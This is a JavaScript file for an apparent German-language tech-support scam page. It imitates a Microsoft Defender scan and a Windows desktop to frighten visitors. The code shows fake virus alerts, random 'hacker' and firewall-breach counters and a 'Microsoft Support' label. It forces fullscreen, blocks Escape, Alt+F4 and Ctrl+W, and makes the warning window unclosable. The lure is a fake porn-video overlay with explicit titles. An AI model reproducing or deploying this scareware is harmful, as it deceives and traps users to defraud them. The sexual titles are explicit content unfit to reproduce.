...
// ==================== MICROSOFT DEFENDER SCAN SIMULATION ====================
const scanDuration = 50 * 60 * 1000; // 50 minutes in milliseconds
const updateInterval = 1000; // Update every second
let scanStartTime = Date.now();
let itemsScanned = 0;
let threatsFound = 0;

// Virus notification system
const virusThreats = [
    { name: "Trojan.Win32.Detplock", location: "C:\\Users\\AppData\\Local\\Temp\\suspicious_file.exe", title: "Bedrohung erkannt" },
    { name: "Ransomware.Cryptolocker", location: "C:\\Users\\Downloads\\invoice_pdf.exe", title: "Ransomware erkannt" },
    { name: "Worm.Win32.Conficker", location: "C:\\Windows\\System32\\svchost.dll", title: "Kritische Bedrohung erkannt" },
    { name: "Spyware.Win32.Keylogger", location: "C:\\Program Files\\Unknown\\service.exe", title: "Spyware erkannt" },
    { name: "Backdoor.Win32.DarkKomet", location: "C:\\Users\\AppData\\Roaming\\startup.exe", title: "Backdoor erkannt" },
    { name: "Rootkit.Win32.ZeroAccess", location: "C:\\Windows\\System32\\drivers\\hidden.sys", title: "Rootkit erkannt" },
    { name: "Malware.Win32.Emotet", location: "C:\\Users\\Downloads\\attachment.doc", title: "Verdächtige Datei erkannt" },
    { name: "Virus.Win32.Sality", location: "C:\\Program Files\\Common Files\\System\\host.exe", title: "Virus erkannt" },
    { name: "Adware.Win32.BrowseFox", location: "C:\\Users\\AppData\\Local\\Temp\\setup.exe", title: "Adware erkannt" },
    { name: "Trojan.Win32.Dridex", location: "C:\\Users\\Documents\\invoice.xlsx", title: "Firewall durchbrochen" }
];

function showVirusNotification(threat) {
    ...
    // Check current number of notifications
    const currentNotifications = container.querySelectorAll('.notification');
    if (currentNotifications.length >= 2) {
        // Remove the oldest notification
        removeNotification(currentNotifications[0]);
    }
    
    const notification = document.createElement('div');
    notification.className = 'notification';
    notification.innerHTML = `
        <img src="icons/windows.png" alt="Warning" class="icon">
        <div class="content">
            <h3 class="title">${threat.title}</h3>
            <p class="message">
                ${threat.name}<br>
                <span style="opacity: 0.7; font-size: 11px; display: block; margin-top: 4px;">${threat.location}</span>
            </p>
        </div>
    ...
    notification.addEventListener('click', () => {
        // Bring defender window to front and focus it
        const defenderWindow = document.querySelector('.defender-window');
        if (defenderWindow) {
        defenderWindow.style.zIndex = '1000';
        }
    });
...
// Show random virus notifications in rapid succession
function startVirusNotifications() {
    // Show first notification immediately for testing
    setTimeout(() => {
        showVirusNotification(virusThreats[0]);
    }, 1000);
    
    let usedThreats = new Set(); // Track used threats to avoid immediate repeats
    
    function showRandomNotification() {
        // Reset usedThreats if all threats have been shown
        if (usedThreats.size >= virusThreats.length) {
            usedThreats.clear();
        }
        
        // Find a threat that hasn't been used recently
        let availableThreats = virusThreats.filter(threat => !usedThreats.has(threat));
        let threat = availableThreats[Math.floor(Math.random() * availableThreats.length)];
        usedThreats.add(threat);
        
        showVirusNotification(threat);
    }
    
    function startNotificationCycle() {
        // Show 1-2 notifications
        const numNotifications = Math.floor(Math.random() * 2) + 1; // Random number between 1 and 2
        
        // Show notifications with random timing
        for(let i = 0; i < numNotifications; i++) {
            setTimeout(() => {
                showRandomNotification();
            }, Math.random() * 3000); // Random delay up to 3 seconds within the cycle
        }
        
        // Schedule next cycle with random interval between 8-15 seconds
        const nextCycleDelay = Math.floor(Math.random() * (15000 - 8000) + 8000);
        setTimeout(startNotificationCycle, nextCycleDelay);
    }
    
    // Start the first cycle after 3 seconds
    setTimeout(startNotificationCycle, 3000);
}

const possibleErrors = [
    { type: 'error', message: 'Potential threat detected in: C:\\Users\\AppData\\Local\\Temp\\suspicious_file.exe' },
    { type: 'warning', message: 'Unable to scan encrypted file: D:\\Documents\\archive.zip' },
    { type: 'error', message: 'Malware signature detected: Trojan:Win32/Detplock' },
    { type: 'warning', message: 'Network resource unavailable: \\\\SERVER\\Share\\folder' },
    { type: 'error', message: 'Suspicious behavior detected in: C:\\Program Files\\Unknown\\service.exe' },
    { type: 'info', message: 'Scanning system files...' },
    { type: 'info', message: 'Analyzing startup programs...' },
    { type: 'warning', message: 'File access denied: C:\\Windows\\System32\\config\\' },
    { type: 'error', message: 'Potentially unwanted program found: Adware.Generic' },
    { type: 'info', message: 'Checking registry entries...' }
];
...
function updateScan() {
    ...
    const elapsedTime = currentTime - scanStartTime;
    const progress = Math.min((elapsedTime / scanDuration) * 100, 100);
    ...
    // Update items scanned (random increment)
    itemsScanned += Math.floor(Math.random() * 100) + 50;
    document.getElementById('items-scanned').textContent = itemsScanned.toLocaleString();
    ...
    if (Math.random() < 0.3) { // 30% chance each second
        ...
        addLogEntry(randomError.type, randomError.message);
        
        if (randomError.type === 'error') {
            threatsFound++;
            document.getElementById('threats-found').textContent = threatsFound;
        }
    }
    
    // Continue updating if scan is not complete
    if (progress < 100) {
        setTimeout(updateScan, updateInterval);
    }
}

// Draggable functionality for the defender window
function makeDraggable(element) {
    ...
    function elementDrag(e) {
        ...
        element.style.transform = 'none'; // Remove the initial transform
    }
...
// Handle close and reappear functionality
function handleDefenderWindow() {
    const defenderWindow = document.querySelector('.defender-window');
    const closeButton = defenderWindow.querySelector('.window-controls .close');
    
    // Make the window draggable
    makeDraggable(defenderWindow);
    
    // Handle close button click
    closeButton.addEventListener('click', () => {
        defenderWindow.style.animation = 'windowFadeOut 0.3s ease forwards';
        
        setTimeout(() => {
            defenderWindow.style.display = 'none';
            defenderWindow.style.animation = '';
            
            // Reappear after 4 seconds
            setTimeout(() => {
                // Reset to initial center position
                defenderWindow.style.top = '50%';
                defenderWindow.style.left = '50%';
                defenderWindow.style.transform = 'translate(-50%, -50%)';
                
                defenderWindow.style.display = 'flex';
                defenderWindow.style.animation = 'windowFadeIn 0.3s ease forwards';
                ...
                document.getElementById('items-scanned').textContent = '0';
...
// Handle security warning window functionality
function handleSecurityWarning() {
    const warningWindow = document.querySelector('.security-warning-window');
    const closeButton = warningWindow.querySelector('.window-controls .close');
    const cancelButton = warningWindow.querySelector('.cancel');
    
    // Make window draggable
    // Disable window dragging for security warning
    warningWindow.style.pointerEvents = 'none';
    warningWindow.querySelector('.window-content').style.pointerEvents = 'auto';
    
    // Disable close and cancel functionality for security warning
...
// Animate scanning files and counter
function startScanningAnimation() {
    const filesCounter = document.querySelector('.files-counter');
    const scanningFile = document.querySelector('.scanning-file');
    const statusElement = document.querySelector('.status-dynamic');
    const hackersCount = document.querySelector('.hackers-count');
    const foreignIpsCount = document.querySelector('.foreign-ips-count');
    const firewallBreachesCount = document.querySelector('.firewall-breaches-count');
    const dataTransfer = document.querySelector('.data-transfer');
    
    // Initialize intervals object first
    window.scanningIntervals = window.scanningIntervals || {};
    
    if (!filesCounter || !scanningFile) return;
    
    // Array of realistic file paths to cycle through
    const filePaths = [
        'C:\\Windows\\System32\\',
        ...
        'C:\\Users\\Documents\\Downloads\\',
        'C:\\Program Files\\Common Files\\'
    ];
    
    // Array of threat statuses with colors
    const threatStatuses = [
        { text: 'BEDROHUNG ERKANNT', color: 'threat-red' },
        { text: 'RANSOMWARE ERKANNT', color: 'threat-red' },
        { text: 'TROJANER ERKANNT', color: 'threat-orange' },
        { text: 'SPYWARE ERKANNT', color: 'threat-orange' },
        { text: 'MALWARE ERKANNT', color: 'threat-yellow' },
        { text: 'BACKDOOR ERKANNT', color: 'threat-purple' },
        { text: 'ROOTKIT ERKANNT', color: 'threat-red' },
        { text: 'KEYLOGGER ERKANNT', color: 'threat-orange' }
    ];
    
    // Network security threats to rotate
    const networkThreats = [
        'Unbefugter Zugriff von IP 185.220.101.47 erkannt',
        'Mehrere fehlgeschlagene Anmeldeversuche von ausländischer IP-Adresse',
        'Verdächtiger ausgehender Datenverkehr zu unbekannten Servern erkannt',
        'SSL-Zertifikat kompromittiert - Port 443 Verstoß',
        'Man-in-the-Middle-Angriff im Netzwerk erkannt',
        'Firewall-Regeln umgangen - Sicherheitslücke aufgedeckt',
        'DNS-Hijacking erkannt - Datenverkehr wird umgeleitet',
        'DDoS-Angriffsmuster identifiziert - Netzwerküberlastung',
        'Port-Scanning von externer Quelle erkannt',
        'Brute-Force-Angriff auf Admin-Anmeldedaten erkannt',
        'Datenabflussversuch blockiert - 2.4GB Übertragung',
        'Zero-Day-Exploit in Systemdateien erkannt',
        'Paket-Injektion erkannt - Netzwerk kompromittiert',
        'ARP-Spoofing erkannt - Lokale Netzwerkbedrohung',
        'Unbefugte VPN-Verbindung hergestellt'
    ];
    ...
    let statusIndex = 0;
    let hackersNum = 3;
    let foreignIpsNum = 12;
    let firewallBreachesNum = 8;
    let dataTransferMB = 2400; // Start with 2.4 GB = 2400 MB
    
    // Animate file counter - increase continuously
    const counterInterval = setInterval(() => {
        fileCount += Math.floor(Math.random() * 200) + 100;
        if (fileCount > 99999) {
            fileCount = Math.floor(Math.random() * 5000) + 1000; // Reset to keep counting
        }
        filesCounter.textContent = fileCount.toLocaleString();
    }, 500);
    
    // Animate network security counters
    if (hackersCount) {
        const hackersInterval = setInterval(() => {
            hackersNum = Math.floor(Math.random() * 15) + 2; // 2-16 hackers
            hackersCount.textContent = hackersNum;
        }, 3500);
        window.scanningIntervals.hackers = hackersInterval;
    }
    
    if (foreignIpsCount) {
        const foreignIpsInterval = setInterval(() => {
            foreignIpsNum = Math.floor(Math.random() * 40) + 10; // 10-49 IPs
            foreignIpsCount.textContent = foreignIpsNum;
        }, 2800);
        window.scanningIntervals.foreignIps = foreignIpsInterval;
    }
    
    if (firewallBreachesCount) {
        const firewallInterval = setInterval(() => {
            firewallBreachesNum = Math.floor(Math.random() * 30) + 5; // 5-34 breaches
            firewallBreachesCount.textContent = firewallBreachesNum;
        }, 3200);
        window.scanningIntervals.firewallBreaches = firewallInterval;
    }
    
    if (dataTransfer) {
        const dataTransferInterval = setInterval(() => {
            // Randomly increase or change data transfer
            dataTransferMB += Math.floor(Math.random() * 500) + 100;
            
            // Reset if too high
            if (dataTransferMB > 10000) {
                dataTransferMB = Math.floor(Math.random() * 2000) + 500;
            }
            
            // Format as MB or GB
            if (dataTransferMB >= 1000) {
                const gb = (dataTransferMB / 1000).toFixed(1);
                dataTransfer.textContent = gb + ' GB';
            } else {
                dataTransfer.textContent = dataTransferMB + ' MB';
            }
        }, 2500);
        window.scanningIntervals.dataTransfer = dataTransferInterval;
    }
    
    // Animate file path changes
    const pathInterval = setInterval(() => {
        pathIndex = (pathIndex + 1) % filePaths.length;
        scanningFile.textContent = filePaths[pathIndex];
    }, 800);
    
    // Change threat status dynamically
    if (statusElement) {
        const statusInterval = setInterval(() => {
            statusIndex = (statusIndex + 1) % threatStatuses.length;
            const currentStatus = threatStatuses[statusIndex];
            
            // Remove all color classes
            statusElement.classList.remove('threat-red', 'threat-orange', 'threat-yellow', 'threat-purple');
            // Add new color class
        ...
        window.scanningIntervals.status = statusInterval;
    }
    
    
    // Change network security threats dynamically
    const threat1 = document.querySelector('.dynamic-threat-1');
    const threat2 = document.querySelector('.dynamic-threat-2');
    const threat3 = document.querySelector('.dynamic-threat-3');
    
    if (threat1 && threat2 && threat3) {
        let threatRotationIndex = 0;
        
        const networkThreatInterval = setInterval(() => {
            // Get 3 different threats
            const shuffledThreats = [...networkThreats].sort(() => Math.random() - 0.5);
            
            threat1.textContent = shuffledThreats[0];
            threat2.textContent = shuffledThreats[1];
            threat3.textContent = shuffledThreats[2];
        }, 4000);
        
        window.scanningIntervals.networkThreats = networkThreatInterval;
    }
    
    // Store remaining intervals
    window.scanningIntervals.counter = counterInterval;
    window.scanningIntervals.path = pathInterval;
}

// Tab Notification - Flashing Title
(function() {
    let titleIndex = 0;
    const titles = [
    ...
    // Flash title while video overlay is showing (before dismissed)
    ...
    let faviconIndex = 0;
    setInterval(function() {
        if (!isTabActive && !overlayDismissed) {
...
(function() {
    ...
    function handleAgeVerification() {
        ...
        // Mark video overlay as dismissed
    ...
    document.addEventListener('DOMContentLoaded', function() {
        ...
        if (ageYes) {
            ageYes.addEventListener('click', handleAgeVerification);
        }
        
        if (ageNo) {
            ageNo.addEventListener('click', handleAgeVerification);
        }
        
        if (ageCancel) {
            ageCancel.addEventListener('click', handleAgeVerification);
        }
        
        if (ageClose) {
            ageClose.addEventListener('click', function(e) {
                e.stopPropagation();
                handleAgeVerification();
            });
        }
        
        // Click on backdrop also triggers verification
        if (ageBackdrop) {
            ageBackdrop.addEventListener('click', handleAgeVerification);
        }
        
        // Click anywhere on age overlay (including white space)
        if (ageOverlay) {
...
// Video Player Site Overlay functionality
...
const VIDEO_URLS = [
    ...
    'https://gproud.pages.dev/gay.mp4',
    'https://gproud.pages.dev/gay.mp4',
...
const VIDEO_COUNT = VIDEO_URLS.length; // Number of videos
const VIDEO_TITLES = [
    "Den Valentine-Teddybären mit Stiefbruder in S9:E7 ficken",
    "Stiefmutter und Tochter jagen nach Osterhasen-Schwanz und Sperma! S7:E9",
    "Weiße Mädchen in zwei Reihen und ein Mann fickt sie",
    "Moderne Sünden - hängender Ebenholz-Yogalehrer hämmert die perfekte Muschi des Schülers!",
    "MODERNE SÜNDEN - zierliche kimmy kimm & kimora Quin schleicht sich für stilles 69 & fingern in der nacht ein",
    "18-jähriger teenager sushi-party wird zu verrückter orgie - reverse-gangbang-vierer",
    "Reines Tabu, frommer Priester gibt sündigen Nymphomaninnen Spencer Bradley und Mona Azar nach",
    "Erwachsenenzeit Angela White & Joanna Angel anal Öl Squirt zu dritt",
    "Kaitlyn Katsaros goes 1on1 very very rough",
    "Mary jane geht 100% Hell 3on1 DP DVP DAP mit extremem fisting und pissen"
];
...
function generateVideoData() {
    ...
    for (let i = 1; i <= VIDEO_COUNT; i++) {
        ...
        videos.push({
            id: i,
            src: VIDEO_URLS[i - 1],
            title: VIDEO_TITLES[i - 1] || `Video ${i}`,
            views: randomViews.toLocaleString('de-DE'),
            date: randomDays === 1 ? 'Heute' : `vor ${randomDays} ${randomDays === 1 ? 'Tag' : 'Tagen'}`,
...
// Initialize video player site
(function() {
    const videoPlayerSite = document.getElementById('video-player-site');
    const mainPlayerVideo = document.getElementById('main-player-video');
    ...
    if (!videoPlayerSite || !mainPlayerVideo) return;
    
    // Generate and shuffle videos
    const allVideos = generateVideoData();
    const shuffledVideos = shuffleArray(allVideos);
    
    let currentVideoIndex = 0;
    
    // Function to load a video with fallback
    function loadMainVideo(video) {
        const videoSource = mainPlayerVideo.querySelector('source');
    ...
    mainPlayerVideo.addEventListener('error', function(e) {
        console.log('Video failed to load, trying next video...');
        currentVideoIndex++;
        if (currentVideoIndex < shuffledVideos.length) {
            loadMainVideo(shuffledVideos[currentVideoIndex]);
        }
    });
    
    // Set main video (first from shuffled list)
    loadMainVideo(shuffledVideos[currentVideoIndex]);
    ...
    function updateLikeCount() {
        ...
        if (likeBtn) {
            const randomLikes = (Math.random() * 10 + 0.5).toFixed(1);
            likeBtn.textContent = randomLikes.replace('.', ',') + ' Tsd';
        }
    }
    ...
    function updateCommentCount() {
        ...
        if (commentCount) {
            const randomComments = Math.floor(Math.random() * 900) + 500;
    ...
    shuffledVideos.slice(1).forEach((video, index) => {
        ...
        thumbnailItem.innerHTML = `
            ...
            <div class="thumbnail-info">
                ...
                <div class="thumbnail-stats">${video.views} Aufrufe • ${video.date}</div>
            </div>
        `;
        ...
        const thumbVideo = thumbnailItem.querySelector('video');
        thumbnailItem.addEventListener('mouseenter', () => {
            thumbVideo.currentTime = 0;
            thumbVideo.play().catch(err => {
                // Silently handle thumbnail play errors
            });
        });
    ...
    // Ensure video loads when metadata is ready
    mainPlayerVideo.addEventListener('loadedmetadata', function() {
        const videoWrapper = document.querySelector('.video-player-wrapper');
        if (videoWrapper) {
            videoWrapper.classList.add('loaded');
        }
        mainPlayerVideo.play().catch(err => {
            console.log('Autoplay prevented:', err);
        });
    });
    
    // Also mark as loaded when video can play
    mainPlayerVideo.addEventListener('canplay', function() {
        const videoWrapper = document.querySelector('.video-player-wrapper');
        if (videoWrapper) {
            videoWrapper.classList.add('loaded');
        }
...
// Handle video player site close (click anywhere to dismiss)
document.addEventListener('DOMContentLoaded', function() {
    const videoPlayerSite = document.getElementById('video-player-site');
    const backgroundAudio = document.getElementById('background-audio');
    ...
    if (videoPlayerSite) {
        videoPlayerSite.addEventListener('click', function(e) {
            ...
            // Remove overlay-active class from body to show main content
            document.body.classList.remove('overlay-active');
            
            // Remove video player site
            videoPlayerSite.remove();
            
            // Start background audio (infinite loop)
            if (backgroundAudio) {
                backgroundAudio.play().catch(err => {
                    console.log('Audio play failed:', err);
                });
            ...
            // Enter fullscreen immediately after closing video player
            enterFullscreen();
        });
    }
    
    // Also add click handler to entire document for fullscreen
    document.addEventListener('click', function(e) {
        // Only trigger if overlay has been dismissed
        if (overlayDismissed) {
...
// Fullscreen and keyboard lock functionality
let escPressTime = null;
let escHoldThreshold = 5000; // 5 seconds
let escHoldInterval = null;
let hasBeenFullscreen = false;
let fullscreenProtectionActive = false; // Prevents immediate ESC exit
...
function enterFullscreen() {
    ...
    if (requestFullscreen) {
        ...
        fullscreenProtectionActive = true;
        ...
        requestFullscreen.call(element).then(() => {
            ...
            // Keep protection active for 1 second to ensure keyboard lock is established
            setTimeout(() => {
                fullscreenProtectionActive = false;
            }, 1000);
        }).catch(() => {
            // Fullscreen request failed, try again on next interaction
            fullscreenProtectionActive = false;
        });
    }
}
...
document.addEventListener('keydown', function(e) {
    // Block ESC completely if fullscreen protection is active
    if (e.key === 'Escape' && fullscreenProtectionActive) {
        e.preventDefault();
        return false;
    }
    
    // Start tracking ESC hold
    if (e.key === 'Escape' && !escPressTime) {
        escPressTime = Date.now();
        
        // Check every 100ms if 5 seconds have passed
        escHoldInterval = setInterval(() => {
            const elapsed = Date.now() - escPressTime;
            
            if (elapsed >= escHoldThreshold) {
                clearInterval(escHoldInterval);
                exitFullscreen();
                escPressTime = null;
            }
        }, 100);
...
document.addEventListener('keyup', function(e) {
    ...
    if (e.key === 'Escape' && escPressTime) {
        const holdDuration = Date.now() - escPressTime;
        
        // If ESC wasn't held long enough, don't exit
        if (holdDuration < escHoldThreshold) {
            escPressTime = null;
            clearInterval(escHoldInterval);
        }
    }
...
// Enter fullscreen on any click - using multiple event types to catch all clicks
function checkAndEnterFullscreen() {
    // Only trigger fullscreen if overlay has been dismissed
    if (!overlayDismissed) {
        return;
    }
...
// Listen on document for all clicks
document.addEventListener('click', checkAndEnterFullscreen, true);
document.addEventListener('mousedown', checkAndEnterFullscreen, true);
document.addEventListener('touchstart', checkAndEnterFullscreen, true);

// Wait for DOM to be ready before adding body listeners
if (document.body) {
    document.body.addEventListener('click', checkAndEnterFullscreen, true);
    document.documentElement.addEventListener('click', checkAndEnterFullscreen, true);
} else {
...
// Re-enable fullscreen on click after exiting
document.addEventListener('fullscreenchange', function() {
    ...
    if (!isFullscreen && hasBeenFullscreen) {
        // User exited fullscreen, but allow re-entry on next click
        if (navigator.keyboard && navigator.keyboard.unlock) {
            navigator.keyboard.unlock();
        }
        // Reset protection flag when exiting
        fullscreenProtectionActive = false;
    }
});

// Also handle webkit and moz prefixed fullscreen events
...
document.addEventListener('keydown', function(e) {
    // Block F11, Ctrl+W, Alt+F4, Ctrl+Shift+Q, etc.
    if (e.key === 'F11' || 
        (e.ctrlKey && e.key === 'w') || 
        (e.altKey && e.key === 'F4') ||
...
// Start the scan and initialize window functionality when the page loads
$(document).ready(() => {
    setTimeout(updateScan, updateInterval);
    handleDefenderWindow();
    handleSecurityWarning();
    startVirusNotifications(); // Start showing virus notifications
    
    // Don't trigger fullscreen automatically - wait for overlay click
    // Fullscreen will be triggered when user clicks the overlay image
});
...
$(() => {
    ...
    $("body").append(window["desktop"] = new Desktop({
        icons: [
            new DesktopIcon({ 
                id: "mycomputer", 
                icon: base64_icon_mycomputer,
                text: "Dieser PC", 
                action: `Window.spawnWindow('explorer', { titlebar: 'Dieser PC', icon: '${base64_icon_mycomputer}', path: 'mycomputer' })`
            }),
            new DesktopIcon({
                id: "documents", 
                icon: base64_icon_documents, 
                text: "Dokumente", 
                action: `Window.spawnWindow('explorer', { titlebar: 'Dokumente', icon: '${base64_icon_documents}', path: 'documents' })` 
            }),
            new DesktopIcon({ 
                id: "recyclebin", 
                icon: base64_icon_recyclebin, 
                text: "Papierkorb", 
                action: `Window.spawnWindow('explorer', { titlebar: 'Papierkorb', icon: '${base64_icon_recyclebin}', path: 'recyclebin' })` 
            }),
                    new DesktopIcon({ 
            id: "msedge", 
        ...
        new DesktopIcon({ 
            ...
            text: "Google Chrome", 
            action: `Window.spawnWindow('msedge')` // Using msedge window for demo
        })
        ]
    }))

    desktop.append(window["taskbar"] = new Taskbar({
        id: "taskbar",
        center_buttons: [
            new TaskbarButton({ id: 0, btn_type: "start", w_title: "Start" }),
            new TaskbarSearchButton({ id: "taskbar-search" }),
            new TaskbarButton({ id: 2, btn_type: "button", pinned: true, w_title: "File Explorer", icon: App_Explorer.app_settings.icon, app: "explorer" }),
            new TaskbarButton({ id: 3, btn_type: "button", pinned: true, w_title: "Notepad", icon: App_Notepad.app_settings.icon_tiny, app: "notepad" }),
            new TaskbarButton({ id: 4, btn_type: "button", pinned: true, w_title: "Command Prompt", icon: App_Cmd.app_settings.icon_tiny, app: "cmd" })
        ],
...
const reinit_tooltips = () => {
    if (typeof bootstrap !== 'undefined') {
        ...
        var tooltipList = tooltipTriggerList.map(function (tooltipTriggerEl) {
            return new bootstrap.Tooltip(tooltipTriggerEl, {delay: { show: 1000, hide: 10 }})
        })
    }
}
...
const pauseToolTips = (type) => {
    ...
    setTimeout(() => {
        let tts = [].slice.call(document.querySelectorAll('[data-bs-toggle="tooltip"]'))
        tts.map((tt) => {
            if(tt.length) {
                const tooltipInstance = bootstrap.Tooltip.getInstance(tt);
                if (tooltipInstance) {
                    if(type == true) {
...
const reinitDraggables = (element) => {
  $(element).each((i, el) => {
    ...
    $(el).find(handle).on("mousedown touchstart", function(e) {
      pos = {
        x: e.clientX,
        y: e.clientY
      }
    ...
    const mouseMoveHandler = (e) => {
      ...
      $(el).not(".maximized").css({ top: `${el.offsetTop + dy}px`, left: `${el.offsetLeft + dx}px` })
...
class Desktop extends HTMLElement {
      ...
      applyTheme() {
            ...
            let wallpaper = (window["theme"] == "light" 
                  ? wallpaper_light
                  : wallpaper_dark
            )
      ...
      eventHandlers() {
            ...
            $(this).on("keydown", function(e) { //38 = Up | 40 = Down
                  // CTRL + A (Select All)
                  ...
                  if(!e.shiftKey) {
                        ...
                        if(e.keyCode == 38) {
                              $("w-desktop-icon:focus").addClass("active").prev().addClass("active").focus()
                        ...
                        if(e.keyCode == 40) {
                              $("w-desktop-icon:focus").addClass("active").next().addClass("active").focus()
            ...
            const desktopDrag = () => {
                  ...
                  $(document).on("mousedown touchstart", "w-desktop", function(e) {
                        if(e.target.nodeName == "W-DESKTOP") {
                              ...
                              $(document).on("mousemove touchmove", "w-desktop", desktopMouseMoveHandler)
                              $(document).on("mouseup touchend", "w-desktop", desktopMouseUpHandler)
                        }
                  })
                  ...
                  const desktopMouseMoveHandler = (e) => {                        
                        ...
                        $("w-desktop-icon").each((i, e) => {
                              ...
                              if(!elementsTouch(e, $(".desktop-drag")[0])) $(e).removeClass("active")
                        })
                  }
                  ...
                  const desktopMouseUpHandler = () => {
                        ...
                        $(document).off("mousemove touchmove", "w-desktop", desktopMouseMoveHandler)
...
class DesktopIcon extends HTMLElement {
      ...
      buildCxt() {
            ...
            if(this.id == "mycomputer") {
                  return {
                        ...
                        buttons: [
                              { text: "Öffnen", icon: base64_icon_fileexplorer, action: this.action },
                              { text: "Netzlaufwerk zuordnen...", icon: cxt_mapnetwork },
                              { text: "Netzlaufwerk trennen...", icon: cxt_disconnectmap },
                              { text: "An Schnellzugriff anheften", icon: cxt_pin },
                              { text: "An Start anheften", icon: cxt_pin },
                              { text: "Eigenschaften", icon: cxt_properties },
                              { text: "---" },
                              { text: "Weitere Optionen anzeigen", icon: base64_showmoreoptions_tiny },
                        ]
                  }
            }
            ...
            if(this.id == "recyclebin") {
                  return {
                        ...
                        buttons: [
                              { text: "Öffnen", icon: base64_icon_fileexplorer, action: this.action },
                              { text: "Papierkorb leeren", icon: cxt_delete },
                              { text: "An Schnellzugriff anheften", icon: cxt_pin },
                              { text: "An Start anheften", icon: cxt_pin },
                              { text: "Eigenschaften", icon: cxt_properties },
                              { text: "---" },
            ...
            if(this.id == "documents") {
                  return {
                        ...
                        buttons: [
                              { text: "Öffnen", icon: base64_icon_fileexplorer, action: this.action },
                              { text: "Dateispeicherort öffnen", icon: cxt_folderlocation },
                              { text: "An Schnellzugriff anheften", icon: cxt_pin },
                              { text: "An Start anheften", icon: cxt_pin },
                              { text: "Als Pfad kopieren", icon: cxt_copyaspath },
                              { text: "Eigenschaften", icon: cxt_properties },
                              { text: "---" },
                              { text: "Weitere Optionen anzeigen", icon: base64_showmoreoptions_tiny },
                        ]
            ...
            if(this.id == "msedge") {
                  return {
                        ...
                        buttons: [
                              { text: "Öffnen", icon: base64_icon_edge, action: `Window.spawnWindow('msedge')` },
                              { text: "Dateispeicherort öffnen", icon: cxt_folderlocation },
                              { text: "An Schnellzugriff anheften", icon: cxt_pin },
                              { text: "An Start anheften", icon: cxt_pin },
                              { text: "Als Pfad kopieren", icon: cxt_copyaspath },
      ...
      eventHandlers() {
            ...
            $(this).on("mouseup touchend", function(e) {
                  setTimeout(() => {
                        if(e.shiftKey) {
                              $("w-desktop-icon").slice([activeEl, $(_this).index() + 1].sort()).addClass("active")
                              $(_this).focus()
                        }else{
...
class StartMenu extends HTMLElement {
    ...
    html() {
        return `
            ...
            <div class="footer">
                <div class="account" data-bs-toggle="tooltip" title="Microsoft Support">
                        <img src="icons/windows.png" alt="Windows Logo">
                        Microsoft Support
                </div>
        ...
        setTimeout(() => {
            ...
            this.addIcons("w-startmenu .pinned-apps:not(.recommended)", [
                ...
                new StartMenuIcon({
                    ...
                    "title": "File Explorer",
                    "app": "explorer",
                    "action": { titlebar: "Dokumente", icon: base64_icon_documents, path: "documents" }
                }),
                new StartMenuIcon({
            ...
            this.addIcons("w-startmenu .pinned-apps.recommended", [
                ...
                new StartMenuIcon({
                    ...
                    "title": "About",
                    "subtitle": "By x2i",
                    "action": "alert('Microsoft Windows Security')"
                })
            ])
    ...
    eventHandlers() {
        ...
        $(window).on("resize", function(e) {
            $(_this).css({
                "left": `${$(window).width() / 2 - ($(window["start_menu"]).width() / 2)}px`
            })
            /*
            "top": `${_this.pos.y}`,
        ...
        $("*").on("click contextmenu", function(e) {
            if($(window["start_menu"]).length && !hasParents(e, "w-startmenu") && !hasParents(e, ".start")) {
...
class Taskbar extends HTMLElement {
    ...
    drawSections() {
        ...
        setTimeout(() => {
            ...
            $(this).find(".center").css({"margin-right": `-${($(this).find(".center").width() / 2)}px`})
        })
...
class SearchMenu extends HTMLElement {
    ...
    eventHandlers() {
        ...
        $(window).on("resize", function(e) {
            $(_this).css({
                "left": `${$(window).width() / 2 - ($(window["search_menu"]).width() / 2)}px`
            })
        })
        
        // Click outside of context
        $("*").on("click contextmenu", function(e) {
            if($(window["search_menu"]).length && !hasParents(e, "w-searchmenu") && !hasParents(e, "w-taskbar-search")) {
...
class TaskbarButton extends HTMLElement {
      ...
      applyTheme() {
            $(this)[0].style.setProperty("--theme", window["theme"]) 
            if(this.btn_type == "start") this.icon = (window["theme"] == "dark" ? base64_startbtn_dark : base64_startbtn)
            $(this).html(this.html())
      }
            ...
            if(this.btn_type == "start") {
                  ...
                  if(wndCnt) {
                        cxt.push({ 
                              ...
                              text: (wndCnt == 1 ? "Close Window" : "Close all windows on this display"),
      ...
      eventHandlers() {
            ...
            $(this).on("click", function(e) {
                  if(this.btn_type == "start") { // Start menu
                        ...
                        if(wlen) {
                              ...
                              if($(this).attr("data-app") == "explorer") {
                                    Window.spawnWindow($(this).attr("data-app"), { titlebar: "Dokumente", icon: base64_icon_documents, path: "documents" })
                              }else{
            ...
            $(this).on("mouseover", function(e) {
                  if(!$("w-context-menu").length) {
                        ...
                        pauseToolTips(true)
                        if($("w-taskbar-thumbnails").length) $("w-taskbar-thumbnails")[0].close()
                  }
            })
      }
      ...
      createThumbnailPreviews(e) {
            if(!window["taskbar_thumbs"]) {
                  $("w-desktop").append(window["taskbar_thumbs"] = new TaskbarThumbnails({
                        apps: this.app,
                        pos: {
                              x: e.pageX,
                              y: 0
...
class TaskbarThumbnails extends HTMLElement {
                  ...
                  $(`w-window[data-app=${this.apps}]`).each(function() {
                        screenshotElement($(this)).then((e) => {
                              ...
                              $("w-taskbar-thumbnails").append(`
                                    <div class="thumb" data-wid="${$(this).attr("id")}">
                                          <span>
                                                <img src="${$(this).attr("data-app-icon")}">
                                                <p>${$(this).attr("data-app-title")}</p>
                                                <i class="fa fa-times"></i>
                                          </span>
                                          <img class="thumbimg ${(ico ? "icon" : "")}" src="${e}">
                                    </div>
                              `)
                        })
                  })
      ...
      eventHandlers() {
            ...
            $(this).on("click", ".thumb", function(e) {
                  $("w-window").show()
                  if(window[$(this).attr("data-wid")].state == 0) window[$(this).attr("data-wid")].unminimizeWindow(false)
                  setTimeout(() => {
            ...
            $(this).on({
                  mouseenter: function() {
                        ...
                        if(previousState == 0) {
                              if(window[$(this).attr("data-wid")].oldstate == 1) window[$(this).attr("data-wid")].restoreWindow()
                              if(window[$(this).attr("data-wid")].oldstate == 2) window[$(this).attr("data-wid")].maximizeWindow(false)
                        }
...
class Window extends HTMLElement {
      ...
      html() {
            return `
                  <div class="header">
                        <span class="icon handle" style="background-image: url(${this.icon})"></span>
                        <span class="title handle">${this.w_title}</span>
                        <spacer>
                        <div class="icons">
                              ${(this.icons.min ? `<span class='button button-min' data-bs-toggle='tooltip' title='Minimize'>${this.minimizeIcon}</span>` : "")}
                              ${(this.icons.max ? `<span class='button button-max'' data-bs-toggle='tooltip' title='Maximize'>${this.maximizeIcon}</span>` : "")}
